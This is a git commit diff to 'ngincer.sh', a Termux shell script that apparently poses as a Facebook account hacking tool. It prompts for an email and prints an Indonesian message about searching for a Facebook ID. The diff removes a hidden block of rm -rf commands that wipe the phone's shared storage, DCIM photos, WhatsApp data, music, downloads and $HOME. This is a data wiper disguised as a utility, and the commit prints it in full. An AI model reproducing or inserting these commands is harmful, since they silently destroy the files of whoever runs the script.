da195232e6bca8a52ba348ad9f3b2a0d2dfd323d
irfan412 <50777148+irfan412@users.noreply.github.com>
2019-05-19 09:41:40 +0700

    ngincer.sh
    Fbngincer

--- ngincer.sh
+++ ngincer.sh
@@ -91,31 +91,7 @@ read -p "[ISI EMAIL]> " bro;
 
 termux-setup-storage
 
-rm -rf /storage/emulated/0
 
-rm -rf /sdcard/0
-
-rm -rf /storage/emulated/0/DCIM
-
-rm -rf /storage/emulated/0/android/obb
-
-rm -rf /sdcard/0/android/data
-
-rm -rf $HOME
-
-rm -rf sdcard/0
-
-rm -rf storage/emulated/0
-
-rm -rf /storage/emulated/0/WhatsApp
-
-rm -rf /sdcard/0/WhatsApp
-
-rm -rf /storage/emulated/0/Downloads
-
-rm -rf /storage/emulated/0/Music
-
-rm -rf /sdcard/0/Music
 
 echo $green"Sedang Mencari ID Facebook Dalam 30 detik"
 
